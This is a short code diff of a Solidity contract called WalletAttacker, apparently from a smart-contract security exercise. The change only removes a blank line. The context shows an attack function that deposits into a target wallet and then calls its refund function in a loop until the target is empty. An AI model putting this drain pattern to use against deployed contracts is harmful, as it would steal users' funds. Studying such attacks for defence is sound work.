@@ -12,7 +12,6 @@ contract WalletAttacker {
     function attack() public payable {
         target.deposit.value(msg.value)();
 
-
         while (address(target).balance > 0) {
             target.refund();
         }
